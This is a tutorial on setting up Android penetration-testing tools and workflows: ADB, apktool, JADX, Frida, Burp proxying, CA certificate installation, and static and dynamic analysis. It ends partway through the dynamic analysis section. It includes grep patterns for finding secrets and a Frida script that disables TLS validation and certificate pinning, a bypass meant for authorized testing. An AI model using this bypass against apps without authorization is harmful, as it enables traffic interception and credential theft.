# Android Penetration Testing - Tools Setup & Configuration Guide

---

## 📋 Table of Contents
1. [Essential Tools Installation](#tools-installation)
2. [Emulator Setup & Configuration](#emulator-setup)
3. [Device Connection & Interaction](#device-interaction)
4. [Proxy Configuration (Burp Suite)](#proxy-configuration)
5. [Static Analysis Workflow](#static-analysis)
6. [Dynamic Analysis Workflow](#dynamic-analysis)
7. [Complete Testing Workflow](#testing-workflow)

---

## 🛠️ SECTION 1: Essential Tools Installation {#tools-installation}

### 1.1 ADB (Android Debug Bridge)

**Purpose:** Device communication, file management, app control

**Windows Installation:**
```bash
# Download Android Platform Tools
# URL: https://developer.android.com/studio/releases/platform-tools

# 1. Extract zip to C:\platform-tools\
# 2. Add to System PATH:
#    - Right-click "This PC" > Properties
#    - Advanced System Settings > Environment Variables
#    - Edit "Path" variable
#    - Add: C:\platform-tools

# 3. Verify installation
# Open CMD and run:
adb version

# Expected Output:
# Android Debug Bridge version 1.0.41
```

**Linux Installation:**
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y adb fastboot

# Verify
adb version

# Expected Output:
# Android Debug Bridge version 1.0.41
```

**Mac Installation:**
```bash
# Using Homebrew
brew install android-platform-tools

# Verify
adb version
```

---

### 1.2 APKTool

**Purpose:** Decompile/Recompile APK files, extract resources

**Installation:**

**Windows:**
```bash
# 1. Download from: https://ibotpeaches.github.io/Apktool/

# 2. Download these files:
#    - apktool_2.9.3.jar (rename to apktool.jar)
#    - apktool.bat (wrapper script)

# 3. Place both files in C:\Windows\

# 4. Verify installation
apktool

# Expected Output:
# Apktool v2.9.3 - a tool for reverse engineering Android apk files
```

**Linux/Mac:**
```bash
# Download apktool wrapper script
sudo wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool

# Download apktool jar
sudo wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar

# Make executable
sudo chmod +x /usr/local/bin/apktool
sudo chmod +x /usr/local/bin/apktool.jar

# Verify
apktool --version

# Expected Output:
# 2.9.3
```

---

### 1.3 JADX / JADX-GUI

**Purpose:** Decompile APK to readable Java source code

**Installation (All Platforms):**
```bash
# 1. Download from: https://github.com/skylot/jadx/releases
#    Download: jadx-1.5.0.zip

# 2. Extract the zip file
unzip jadx-1.5.0.zip -d jadx

# 3. Navigate to bin folder
cd jadx/bin

# Linux/Mac - Make executable
chmod +x jadx jadx-gui

# 4. Add to PATH (Optional)
# Linux/Mac:
export PATH=$PATH:/path/to/jadx/bin
# Add to ~/.bashrc or ~/.zshrc for permanent

# Windows: Add jadx/bin to System PATH
```

**Usage:**
```bash
# GUI version (recommended)
jadx-gui

# Command line
jadx app.apk -d output_folder
```

---

### 1.4 Frida

**Purpose:** Dynamic instrumentation, runtime manipulation

**Installation:**

**Step 1: Install Frida Tools on Host Machine**
```bash
# Requires Python 3.8+
python3 --version

# Install Frida tools
pip3 install frida-tools

# Verify installation
frida --version

# Expected Output:
# 16.1.10 (or latest version)
```

**Step 2: Download Frida Server for Android**
```bash
# 1. Check your Frida version
frida --version
# Note: 16.1.10

# 2. Visit: https://github.com/frida/frida/releases
# 3. Download matching version for your device architecture:

# For ARM64 devices (most modern phones):
# frida-server-16.1.10-android-arm64.xz

# For x86 emulators:
# frida-server-16.1.10-android-x86.xz

# For ARM32 (older devices):
# frida-server-16.1.10-android-arm.xz
```

**How to Check Device Architecture:**
```bash
adb shell getprop ro.product.cpu.abi

# Output examples:
# arm64-v8a    → Use android-arm64
# x86          → Use android-x86
# armeabi-v7a  → Use android-arm
```

---

### 1.5 Burp Suite

**Purpose:** Intercept and modify HTTP/HTTPS traffic

**Installation:**

**Community Edition (Free):**
```bash
# 1. Download from:
# https://portswigger.net/burp/communitydownload

# 2. Install based on OS:

# Windows: Run installer burpsuite_community_windows_xxx.exe

# Linux:
chmod +x burpsuite_community_linux_xxx.sh
./burpsuite_community_linux_xxx.sh

# Mac: Open DMG and drag to Applications

# 3. Launch Burp Suite
java -jar burpsuite_community.jar
# Or use installed launcher
```

---

### 1.6 MobSF (Optional - Automated Scanning)

**Purpose:** Automated static and dynamic analysis

**Installation via Docker:**
```bash
# 1. Install Docker
# Windows/Mac: Docker Desktop
# Linux: sudo apt-get install docker.io

# 2. Pull MobSF image
docker pull opensecurity/mobile-security-framework-mobsf:latest

# 3. Run MobSF
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# 4. Access in browser
# http://localhost:8000
```

---

## 📱 SECTION 2: Emulator Setup & Configuration {#emulator-setup}

### 2.1 Android Studio Emulator Setup

**Step 1: Install Android Studio**
```bash
# Download from: https://developer.android.com/studio

# Windows: Run installer
# Linux: Extract tar.gz and run studio.sh
# Mac: Open DMG and install
```

**Step 2: Install System Image**
```
1. Open Android Studio
2. Click "More Actions" > "Virtual Device Manager"
   (or Tools > Device Manager)
3. Click "Create Device"
4. Select Device: Pixel 5 (recommended)
5. Click "Next"
6. Download System Image:
   - Release Name: S (Android 12) or R (Android 11)
   - API Level: 31 or 30
   - Target: "x86_64" architecture (faster on PC)
   - ABI: x86_64
   - Click "Download" next to the image
7. Wait for download to complete
8. Click "Next"
9. Configure AVD:
   - AVD Name: Pixel_5_API_30
   - Startup orientation: Portrait
   - Click "Show Advanced Settings"
   - Graphics: Hardware - GLES 2.0
   - Boot option: Cold boot
   - Memory: RAM: 2048 MB
10. Click "Finish"
```

**Step 3: Start Emulator**
```
Method 1: From Android Studio
- Device Manager > Click Play button next to your AVD

Method 2: From Command Line
# List available emulators
emulator -list-avds

# Expected Output:
# Pixel_5_API_30

# Start emulator
emulator -avd Pixel_5_API_30

# Start with writable system (for root operations)
emulator -avd Pixel_5_API_30 -writable-system
```

**Step 4: Enable Root Access**
```bash
# Emulators are rooted by default
# Verify root access:

adb root
# Output: restarting adbd as root

adb shell

# You should see:
# generic_x86_64:/ # (root shell)

# Test root
su
id

# Expected Output:
# uid=0(root) gid=0(root) groups=0(root)

exit
```

---

### 2.2 Genymotion Setup (Alternative - Faster)

**Installation:**
```bash
# 1. Download from: https://www.genymotion.com/download/
#    Choose "Genymotion Desktop" - Free for personal use

# 2. Install VirtualBox (dependency)
#    https://www.virtualbox.org/wiki/Downloads

# 3. Install Genymotion

# 4. Launch Genymotion
# 5. Sign up for free account
# 6. Click "+" to add virtual device
# 7. Select device (e.g., Google Pixel 5 - Android 11)
# 8. Click "Install" and wait
# 9. Click "Start" to launch
```

**Root Access in Genymotion:**
```
Genymotion devices are pre-rooted!

Verify:
adb shell su -c "id"
# Output: uid=0(root) gid=0(root)
```

---

### 2.3 Recommended Emulator Configuration

**For Testing Purposes:**
```
Device: Pixel 5 or Pixel 4
Android Version: 11 (API 30) or 12 (API 31)
Architecture: x86_64 (for PC performance)
RAM: 2048 MB minimum
Storage: 2048 MB internal storage
Graphics: Hardware - GLES 2.0
Root Access: YES (required)
Google APIs: YES (for Google Play services)
```

---

## 🔗 SECTION 3: Device Connection & Interaction {#device-interaction}

### 3.1 Connecting Device via ADB

**For Physical Device:**
```bash
# Step 1: Enable Developer Options on phone
# Settings > About Phone > Tap "Build Number" 7 times

# Step 2: Enable USB Debugging
# Settings > Developer Options > Enable "USB Debugging"

# Step 3: Connect via USB cable

# Step 4: Verify connection
adb devices

# Expected Output:
# List of devices attached
# 0123456789ABCDEF    device

# If shows "unauthorized":
# 1. Check phone for authorization popup
# 2. Check "Always allow from this computer"
# 3. Click "OK"
# 4. Run: adb devices again
```

**For Emulator:**
```bash
# Emulators auto-connect when launched

# Check connection
adb devices

# Expected Output:
# List of devices attached
# emulator-5554    device
```

**Multiple Devices:**
```bash
# List all devices
adb devices

# Output:
# List of devices attached
# emulator-5554     device
# 192.168.1.100:5555 device
# 0123456789ABCDEF  device

# Target specific device
adb -s emulator-5554 shell
adb -s 0123456789ABCDEF install app.apk
```

---

### 3.2 Essential ADB Commands

**Device Management:**
```bash
# List connected devices
adb devices

# Reboot device
adb reboot

# Reboot to recovery
adb reboot recovery

# Start ADB server
adb start-server

# Kill ADB server (if issues)
adb kill-server
adb start-server

# Get device properties
adb shell getprop ro.build.version.release  # Android version
adb shell getprop ro.product.model          # Device model
adb shell getprop ro.product.cpu.abi        # CPU architecture
```

**Root Operations:**
```bash
# Restart ADB as root
adb root

# Remount system partition as writable
adb remount

# Open root shell
adb shell su

# Execute command as root
adb shell su -c "command_here"

# Example: List app data
adb shell su -c "ls -la /data/data/"
```

**Application Management:**
```bash
# Install APK
adb install app.apk

# Install with replace (if already installed)
adb install -r app.apk

# Uninstall app
adb uninstall com.example.app

# List installed packages
adb shell pm list packages

# List third-party packages only
adb shell pm list packages -3

# Search for specific package
adb shell pm list packages | grep keyword

# Get APK path
adb shell pm path com.example.app
# Output: package:/data/app/com.example.app-xxxx/base.apk

# Pull APK from device
adb pull /data/app/com.example.app-xxxx/base.apk ./app.apk

# Clear app data
adb shell pm clear com.example.app

# Get app info
adb shell dumpsys package com.example.app
```

**File Operations:**
```bash
# Push file to device
adb push local_file.txt /sdcard/

# Pull file from device
adb pull /sdcard/remote_file.txt ./

# List files (normal user access)
adb shell ls /sdcard/

# List files with root
adb shell su -c "ls -la /data/data/com.example.app/"

# Create directory
adb shell mkdir /sdcard/test_folder/

# Remove file
adb shell rm /sdcard/test_file.txt
```

**Logcat (View Logs):**
```bash
# View all logs (real-time)
adb logcat

# Clear logs
adb logcat -c

# Save logs to file
adb logcat > logs.txt

# Filter by app package
adb logcat | grep com.example.app

# Filter by tag
adb logcat -s "LoginActivity"

# Filter by priority (V=Verbose, D=Debug, I=Info, W=Warning, E=Error, F=Fatal)
adb logcat *:E  # Show only errors

# Format options
adb logcat -v time      # Show timestamps
adb logcat -v threadtime # Show thread info and timestamps

# Combination filter
adb logcat -v time | grep -i "password\|token\|secret"
```

**Activity Management:**
```bash
# Start main activity
adb shell am start -n com.example.app/.MainActivity

# Start activity with intent data
adb shell am start -n com.example.app/.PaymentActivity \
  --es "amount" "100" \
  --es "recipient" "john@example.com"

# Start activity with intent action
adb shell am start -a android.intent.action.VIEW -d "myapp://deeplink"

# Force stop app
adb shell am force-stop com.example.app

# Send broadcast
adb shell am broadcast -a com.example.app.ACTION_NAME

# Start service
adb shell am startservice -n com.example.app/.MyService
```

**Network & Proxy:**
```bash
# Set global HTTP proxy
adb shell settings put global http_proxy <ip>:8080

# Example:
adb shell settings put global http_proxy 192.168.1.100:8080

# Verify proxy
adb shell settings get global http_proxy
# Output: 192.168.1.100:8080

# Remove proxy
adb shell settings put global http_proxy :0

# Or delete proxy
adb shell settings delete global http_proxy

# Check Wi-Fi status
adb shell dumpsys wifi | grep "Wi-Fi is"
```

**Screenshot & Recording:**
```bash
# Take screenshot
adb shell screencap /sdcard/screenshot.png
adb pull /sdcard/screenshot.png ./

# Record screen (Android 4.4+)
adb shell screenrecord /sdcard/demo.mp4
# Press Ctrl+C to stop recording
adb pull /sdcard/demo.mp4 ./

# Record with time limit (max 180 seconds)
adb shell screenrecord --time-limit 60 /sdcard/demo.mp4
```

---

### 3.3 Frida Server Setup on Device/Emulator

**Step 1: Extract Frida Server**
```bash
# Navigate to download location
cd ~/Downloads

# Extract the XZ file
# Linux/Mac:
unxz frida-server-16.1.10-android-x86.xz

# Windows: Use 7-Zip or similar tool

# Rename for simplicity
mv frida-server-16.1.10-android-x86 frida-server
```

**Step 2: Push to Device**
```bash
# Push to /data/local/tmp (writable location)
adb push frida-server /data/local/tmp/

# Expected Output:
# frida-server: 1 file pushed. 15.2 MB/s (45281304 bytes in 2.840s)

# Make executable
adb shell chmod 755 /data/local/tmp/frida-server
```

**Step 3: Start Frida Server**
```bash
# Method 1: Foreground (for testing)
adb shell su -c "/data/local/tmp/frida-server"
# Server runs in foreground, press Ctrl+C to stop

# Method 2: Background (recommended)
adb shell su -c "/data/local/tmp/frida-server &"

# Method 3: Start on boot (persistent)
adb shell su -c "nohup /data/local/tmp/frida-server >/dev/null 2>&1 &"
```

**Step 4: Verify Frida is Running**
```bash
# From host machine
frida-ps -U

# Expected Output:
# PID  Name
# ----  ------
# 1234  system_server
# 2345  com.android.systemui
# 3456  com.example.app
# ...

# If you get error:
# "Failed to enumerate processes: unable to connect to remote frida-server"
# Check if frida-server is running:
adb shell su -c "ps | grep frida-server"
```

**Verify Version Match:**
```bash
# Check Frida client version
frida --version
# Output: 16.1.10

# Check Frida server version
adb shell su -c "/data/local/tmp/frida-server --version"
# Output: 16.1.10

# Versions must match!
```

**Troubleshooting:**
```bash
# Kill existing frida-server
adb shell su -c "killall frida-server"

# Check for port conflicts
adb shell su -c "netstat -tuln | grep 27042"
# Frida uses port 27042 by default

# Restart with verbose logging
adb shell su -c "/data/local/tmp/frida-server -vvv"
```

---

## 🌐 SECTION 4: Proxy Configuration (Burp Suite) {#proxy-configuration}

### 4.1 Burp Suite Initial Setup

**Step 1: Launch Burp Suite**
```bash
# Start Burp Suite
java -jar burpsuite_community.jar
# Or use installed launcher

# First launch:
1. Select "Temporary project"
2. Click "Next"
3. Select "Use Burp defaults"
4. Click "Start Burp"
```

**Step 2: Configure Proxy Listener**
```
1. Go to: Proxy > Options (or Proxy > Proxy settings in newer versions)

2. Under "Proxy Listeners" section:
   - Click "Add"

3. Configure Binding:
   - Bind to port: 8080
   - Bind to address: "All interfaces"
   
4. Click "OK"

5. Verify listener is running:
   - Look for: 0.0.0.0:8080 with "Running" status
```

**Alternative: Edit Existing Listener:**
```
1. Proxy > Options
2. Select default listener (127.0.0.1:8080)
3. Click "Edit"
4. Change "Bind to address" to "All interfaces"
5. Click "OK"
```

---

### 4.2 Export Burp CA Certificate

**Step 1: Export Certificate**
```
1. In Burp Suite: Proxy > Options (or Proxy > Proxy settings)
2. Scroll to "Proxy Listeners" section
3. Click "Import / export CA certificate"
4. Select "Export" tab
5. Select "Certificate in DER format"
6. Click "Select file"
7. Save as: burp_cert.der
8. Click "Next"
9. Click "Close"
```

---

### 4.3 Install Certificate on Android (Emulator/Device)

**Method 1: For Android 7+ (Recommended - System Certificate)**

**Step 1: Convert Certificate Format**
```bash
# Convert DER to PEM
openssl x509 -inform DER -in burp_cert.der -out burp_cert.pem

# Get certificate hash (needed for filename)
openssl x509 -inform PEM -subject_hash_old -in burp_cert.pem | head -1

# Example Output:
# 9a5ba575

# Rename certificate with hash
cp burp_cert.pem 9a5ba575.0

# Replace 9a5ba575 with your actual hash!
```

**Step 2: Push Certificate to System**
```bash
# For Emulator (easier):

# Restart ADB as root
adb root

# Remount system as writable
adb remount

# Push certificate
adb push 9a5ba575.0 /system/etc/security/cacerts/

# Set permissions
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0

# Reboot device
adb reboot

# Wait for reboot...
```

**For Rooted Physical Device:**
```bash
# Same steps, but need Magisk TrustUserCerts module
# Or manually remount:
adb shell
su
mount -o rw,remount /system
exit

# Then continue with push and chmod commands
```

**Step 3: Verify Installation**
```bash
# After reboot
adb shell ls /system/etc/security/cacerts/ | grep 9a5ba575

# Expected Output:
# 9a5ba575.0

# Or check in device settings:
# Settings > Security > Trusted credentials > System
# You should see "PortSwigger CA"
```

---

**Method 2: User Certificate (Android 7+, No Root - Limited)**

**Note:** Apps targeting Android 7+ won't trust user certificates by default unless they explicitly allow it in network security config.

```bash
# Step 1: Push certificate to SD card
adb push burp_cert.der /sdcard/

# Step 2: Install via Settings
# On the device:
1. Settings > Security > Advanced > Encryption & credentials
2. Click "Install a certificate"
3. Select "CA certificate"
4. Warning appears - Click "Install anyway"
5. Navigate to /sdcard/
6. Select burp_cert.der
7. Give it a name: "Burp Suite CA"
8. Click "OK"

# Step 3: Verify
# Settings > Security > Trusted credentials > User tab
# You should see "Burp Suite CA"
```

---

### 4.4 Configure Android Proxy Settings

**Method 1: Via ADB (Global Proxy - Recommended)**
```bash
# Get your computer's IP address

# Windows:
ipconfig
# Look for IPv4 Address under your active network adapter
# Example: 192.168.1.100

# Linux/Mac:
ifconfig
# or
ip addr show
# Look for inet address
# Example: 192.168.1.100

# Set proxy on Android
adb shell settings put global http_proxy 192.168.1.100:8080

# Verify proxy is set
adb shell settings get global http_proxy

# Expected Output:
# 192.168.1.100:8080
```

**Method 2: Via Wi-Fi Settings (Manual)**
```
1. On Android device: Settings > Network & Internet > Wi-Fi
2. Long press on connected Wi-Fi network
3. Click "Modify network" or tap the gear icon
4. Click "Advanced options"
5. Proxy: Select "Manual"
6. Proxy hostname: <your_computer_ip> (e.g., 192.168.1.100)
7. Proxy port: 8080
8. Bypass proxy for: (leave empty)
9. Click "Save"
```

**Verify Proxy Configuration:**
```bash
# Check proxy setting
adb shell settings get global http_proxy

# Test with browser
# Open browser app on Android
# Navigate to: http://burp
# You should see "Burp Suite is running" message
```

---

### 4.5 Testing Proxy Connection

**Step 1: Enable Intercept in Burp**
```
Burp Suite > Proxy > Intercept
Click "Intercept is off" to turn it ON
```

**Step 2: Generate Traffic from Android**
```bash
# Open any app on Android
# Or use browser to visit: http://example.com

# You should see HTTP request in Burp Suite Intercept tab
```

**Expected in Burp:**
```
GET / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Linux; Android 11; ...)
```

**Step 3: Forward Request**
```
Click "Forward" button in Burp
Request will be sent to server
```

**Step 4: View HTTP History**
```
Burp Suite > Proxy > HTTP history
You should see all captured requests
```

---

### 4.6 Troubleshooting Proxy Issues

**Issue 1: No Traffic in Burp**
```bash
# Check 1: Verify proxy setting
adb shell settings get global http_proxy

# Check 2: Verify Burp listener
# Burp > Proxy > Options
# Ensure listener shows: 0.0.0.0:8080 [Running]

# Check 3: Test connectivity
# From Android terminal:
adb shell
ping <your_computer_ip>
# Should get responses

# Check 4: Firewall
# Ensure port 8080 is allowed in your computer's firewall
```

**Issue 2: HTTPS Traffic Not Visible**
```bash
# Likely certificate issue

# Verify certificate installation:
adb shell ls /system/etc/security/cacerts/ | grep <your_cert_hash>

# Re-install certificate if needed
```

**Issue 3: "SSL Handshake Failed" in Burp**
```
Cause: App has SSL pinning

Solution: Need to bypass SSL pinning (covered in Dynamic Analysis)
```

**Issue 4: Some Apps Ignore Proxy**
```
Cause: App uses custom proxy settings or direct socket connections

Solution: 
1. Use transparent proxy mode
2. Or use iptables rules to redirect traffic
```

---

## 📖 SECTION 5: Static Analysis Workflow {#static-analysis}

### 5.1 Obtaining the APK

**Method 1: From Device (Installed App)**
```bash
# Step 1: Find package name
adb shell pm list packages | grep <app_keyword>

# Example output:
# package:com.example.targetapp

# Step 2: Get APK path
adb shell pm path com.example.targetapp

# Example output:
# package:/data/app/com.example.targetapp-xxxxx==/base.apk

# Step 3: Pull APK
adb pull /data/app/com.example.targetapp-xxxxx==/base.apk ./target_app.apk

# Expected Output:
# /data/app/...base.apk: 1 file pulled. 12.5 MB/s (45281304 bytes in 3.442s)
```

**Method 2: From APK File (Already Downloaded)**
```bash
# If you already have the APK file
# Simply copy it to your working directory

cp ~/Downloads/app-release.apk ./target_app.apk
```

---

### 5.2 Static Analysis - Step by Step

**Step 1: Decompile with APKTool**

**Purpose:** Extract resources, AndroidManifest.xml, smali code

```bash
# Navigate to working directory
cd ~/android_testing

# Decompile APK
apktool d target_app.apk -o decompiled_app

# Expected Output:
# I: Using Apktool 2.9.3
# I: Loading resource table...
# I: Decoding AndroidManifest.xml with resources...
# I: Decoding file-resources...
# I: Decoding values */* XMLs...
# I: Baksmaling classes.dex...
# I: Copying assets and libs...
# I: Copying unknown files...
# I: Copying original files...
# I: Copying META-INF/services directory

# Verify output
ls -la decompiled_app/

# Expected structure:
# drwxr-xr-x  AndroidManifest.xml
# drwxr-xr-x  apktool.yml
# drwxr-xr-x  res/
# drwxr-xr-x  smali/
# drwxr-xr-x  assets/
# drwxr-xr-x  lib/
# drwxr-xr-x  original/
# drwxr-xr-x  unknown/
```

**What You Get:**
- `AndroidManifest.xml` - Readable manifest file
- `res/` - All resources (layouts, strings, images)
- `smali/` - Smali code (bytecode)
- `assets/` - App assets
- `lib/` - Native libraries

---

**Step 2: Decompile with JADX (Java Source)**

**Purpose:** Get readable Java source code

```bash
# Method 1: Using JADX-GUI (Recommended)
jadx-gui target_app.apk

# JADX-GUI will open
# Wait for decompilation (progress bar at bottom)
```

**JADX-GUI Features:**
- **Navigation Tree (Left):** Browse packages and classes
- **Code View (Center):** View decompiled Java code
- **Search:**
  - `Ctrl+F` - Search in current file
  - `Ctrl+Shift+F` - Search in all files (Global search)
- **Find Usage:** Right-click on method/class > Find Usage
- **Jump to Declaration:** Ctrl+Click on any class/method
- **Save All:** File > Save All (export entire project)

**Method 2: Command Line**
```bash
# Decompile to folder
jadx target_app.apk -d jadx_output

# Expected Output:
# INFO  - loading ...
# INFO  - processing ...
# INFO  - done

# Navigate to output
cd jadx_output
ls -la

# Structure:
# resources/
# sources/
#   com/
#     example/
#       targetapp/
#         MainActivity.java
#         ...
```

---

**Step 3: Analyze AndroidManifest.xml**

```bash
cd decompiled_app

# View manifest
cat AndroidManifest.xml

# Or use text editor
nano AndroidManifest.xml
# Or: code AndroidManifest.xml (VS Code)
```

**What to Look For:**
```xml
1. Package name
<manifest package="com.example.targetapp">

2. Permissions (look for dangerous ones)
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.CAMERA" />

3. Debuggable flag
<application android:debuggable="true"> <!-- VULNERABLE! -->

4. Backup allowed
<application android:allowBackup="true"> <!-- VULNERABLE! -->

5. Clear text traffic
<application android:usesCleartextTraffic="true"> <!-- VULNERABLE! -->

6. Exported components
<activity android:name=".AdminActivity" android:exported="true" />
<service android:name=".PaymentService" android:exported="true" />
<receiver android:name=".DataReceiver" android:exported="true" />
<provider android:name=".DataProvider" android:exported="true" />

7. Deep links
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <data android:scheme="myapp" android:host="payment" />
</intent-filter>
```

**Quick Analysis Commands:**
```bash
# Count exported components
echo "Exported Activities:"
grep -c 'activity.*exported="true"' AndroidManifest.xml

echo "Exported Services:"
grep -c 'service.*exported="true"' AndroidManifest.xml

echo "Exported Receivers:"
grep -c 'receiver.*exported="true"' AndroidManifest.xml

echo "Exported Providers:"
grep -c 'provider.*exported="true"' AndroidManifest.xml

# List all permissions
grep "uses-permission" AndroidManifest.xml

# Check security flags
grep "debuggable\|allowBackup\|usesCleartextTraffic" AndroidManifest.xml
```

---

**Step 4: Analyze Resources**

```bash
# Check strings.xml for sensitive data
cat res/values/strings.xml

# Look for:
grep -i "password\|api_key\|secret\|token" res/values/strings.xml

# Check all XML files in values
cat res/values/*.xml | grep -i "password\|key\|secret"

# Check assets folder
ls -la assets/
cat assets/*.json
cat assets/*.properties
cat assets/*.config
```

---

**Step 5: Search for Hardcoded Secrets in JADX**

```
1. Open JADX-GUI with target_app.apk

2. Use Global Search (Ctrl+Shift+F)

3. Search for these keywords one by one:
   - "password"
   - "api_key" or "apiKey"
   - "secret"
   - "token"
   - "Bearer "
   - "Authorization"
   - "sk_live" (Stripe keys)
   - "AIza" (Google API keys)
   - "AWS" (Amazon keys)
   - "jdbc:" (Database connections)

4. Review each result:
   - Look for hardcoded values
   - Check if they're actually used (not just variable names)
   - Document findings with screenshots

5. Search for Base64 encoded strings:
   - Look for long strings in quotes
   - Decode suspicious base64: echo "c3RyaW5n" | base64 -d
```

---

**Step 6: Analyze Code for Security Issues**

**Navigate through JADX:**
```
Common files to check:

1. MainActivity.java
   - Check onCreate() for hardcoded data
   - Look for authentication logic

2. LoginActivity.java / AuthActivity.java
   - Check credential validation
   - Look for authentication bypass

3. ApiClient.java / NetworkManager.java
   - Check for SSL pinning
   - Look for API endpoints
   - Check certificate validation

4. DatabaseHelper.java / DBManager.java
   - Check for SQL injection vulnerabilities
   - Look for encryption of sensitive data

5. PreferencesManager.java / SharedPrefs.java
   - Check what's being stored
   - Look for encryption

6. CryptoManager.java / EncryptionUtil.java
   - Check encryption algorithms
   - Look for weak implementations

7. PaymentActivity.java / TransactionActivity.java
   - Check for price manipulation
   - Look for business logic flaws
```

**Search Patterns in Code:**
```
In JADX Global Search (Ctrl+Shift+F):

1. Logging:
   - "Log.d" or "Log.v" or "Log.i"
   - Check what's being logged

2. SQL queries:
   - "rawQuery"
   - "execSQL"
   - Look for string concatenation (SQL injection)

3. SharedPreferences:
   - "getSharedPreferences"
   - "putString"
   - Check if sensitive data is stored

4. Network calls:
   - "HttpURLConnection"
   - "OkHttpClient"
   - "Retrofit"
   - Check SSL/TLS implementation

5. File operations:
   - "FileOutputStream"
   - "FileInputStream"
   - Check what's being written/read

6. Crypto:
   - "Cipher"
   - "MessageDigest"
   - "SecretKey"
   - Check algorithms (look for DES, MD5, SHA1 - weak!)

7. WebView:
   - "WebView"
   - "addJavascriptInterface"
   - "setJavaScriptEnabled"
```

---

**Step 7: Document Static Analysis Findings**

Create a checklist:
```
Static Analysis Checklist:

[ ] AndroidManifest Analysis
    [ ] Debuggable: true/false
    [ ] Backup allowed: true/false
    [ ] Clear text traffic: true/false
    [ ] Exported components: count and names
    [ ] Dangerous permissions: list

[ ] Hardcoded Secrets
    [ ] API keys found: yes/no (list if yes)
    [ ] Passwords found: yes/no
    [ ] Tokens found: yes/no
    [ ] Connection strings: yes/no

[ ] Code Analysis
    [ ] Insecure logging: yes/no
    [ ] SQL injection possible: yes/no
    [ ] Weak cryptography: yes/no
    [ ] SSL pinning: implemented/not implemented
    [ ] Certificate validation: proper/improper

[ ] Data Storage
    [ ] SharedPreferences usage: encrypted/plain
    [ ] Database usage: encrypted/plain
    [ ] File storage: secure/insecure
```

---

## 🔄 SECTION 6: Dynamic Analysis Workflow {#dynamic-analysis}

### 6.1 Dynamic Analysis Prerequisites

**Pre-flight Checklist:**
```bash
# 1. Device/Emulator running
adb devices
# Must show: device

# 2. Root access available
adb shell su -c "id"
# Must show: uid=0(root)

# 3. Frida server running
frida-ps -U
# Must list processes

# 4. Proxy configured
adb shell settings get global http_proxy
# Must show: <your_ip>:8080

# 5. Burp Suite running
# Check: Proxy > Intercept (listening on 0.0.0.0:8080)

# 6. Certificate installed (for HTTPS)
adb shell ls /system/etc/security/cacerts/ | grep <cert_hash>
# Must show your certificate

# 7. Target app installed
adb shell pm list packages | grep com.example.targetapp
# Must show the package
```

---

### 6.2 Dynamic Analysis - Step by Step

**Step 1: Monitor Logs (Logcat)**

```bash
# Open new terminal window for logcat

# Clear existing logs
adb logcat -c

# Start monitoring (filter by app)
adb logcat | grep com.example.targetapp

# Or save to file
adb logcat | tee app_logs.txt

# In another terminal, use the app:
# - Launch app
# - Login
# - Perform various operations
# - Use all features

# Look for in logs:
# - Passwords, tokens, secrets
# - API endpoints
# - Error messages
# - Stack traces
```

**Advanced Filtering:**
```bash
# Filter by priority (show only errors)
adb logcat *:E

# Filter by tag
adb logcat -s "LoginActivity"

# Multiple filters
adb logcat -s "LoginActivity:D" "ApiService:V"

# Search for keywords in real-time
adb logcat | grep -i --color "password\|token\|secret\|api"

# With timestamp
adb logcat -v time | grep com.example.targetapp
```

---

**Step 2: Intercept Network Traffic**

**Configure Burp:**
```
1. Burp Suite > Proxy > Intercept
2. Turn Intercept ON

3. Proxy > HTTP history
   Keep this tab open to monitor all requests
```

**On Android Device:**
```bash
# Launch the application
adb shell am start -n com.example.targetapp/.MainActivity

# Perform actions:
# - Login
# - Browse content
# - Make API calls
# - Submit forms
# - Make payments
```

**In Burp Suite:**
```
1. Watch requests appear in Intercept tab

2. For each request:
   - Review headers (Authorization tokens, cookies)
   - Review body (passwords, sensitive data)
   - Click "Forward" to send
   - Or click "Drop" to block

3. After testing, turn Intercept OFF

4. Go to Proxy > HTTP history
   - Review all captured requests
   - Look for sensitive data in requests/responses
   - Check for unencrypted HTTP traffic
   - Note API endpoints
```

**Test for Issues:**
```
1. Look for HTTP (not HTTPS) traffic
   - Credentials over HTTP?
   - API keys exposed?

2. Check authentication headers
   - Tokens in URL parameters? (bad)
   - Authorization header present? (good)

3. Test authentication
   - Remove Authorization header
   - Forward request
   - Does it still work? (vulnerability!)

4. Test authorization
   - Change user_id in requests
   - Can you access other users' data? (IDOR)
```

---

**Step 3: Bypass SSL Pinning (if needed)**

**Check if SSL Pinning is Present:**
```bash
# Try to intercept HTTPS traffic
# If you see "Connection failed" or empty responses in Burp
# SSL pinning might be implemented
```

**Bypass using Objection:**
```bash
# Method 1: Objection (easiest)

# Launch app with objection
objection -g com.example.targetapp explore

# In objection console:
android sslpinning disable

# Expected Output:
# (agent) [android.sslpinning.disable] Android SSL Pinning disabled

# Now try to intercept traffic in Burp
# Traffic should now be visible
```

**Bypass using Frida Script:**
```bash
# Method 2: Custom Frida script

# Create file: ssl-bypass.js
nano ssl-bypass.js
```

```javascript
// ssl-bypass.js
Java.perform(function() {
    console.log("[*] Starting SSL Bypass");
    
    // Bypass TrustManager
    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManagerImpl = Java.registerClass({
        name: 'com.sensepost.test.TrustManagerImpl',
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {
                console.log("[+] checkClientTrusted called");
            },
            checkServerTrusted: function(chain, authType) {
                console.log("[+] checkServerTrusted called");
            },
            getAcceptedIssuers: function() {
                console.log("[+] getAcceptedIssuers called");
                return [];
            }
        }
    });
    
    // Bypass OkHttp CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log("[+] OkHttp CertificatePinner bypassed for: " + hostname);
            return;
        };
    } catch(e) {
        console.log("[-] OkHttp CertificatePinner not found");
    }
    
    console.log("[*] SSL Pinning Bypass Complete");
});
```

```bash
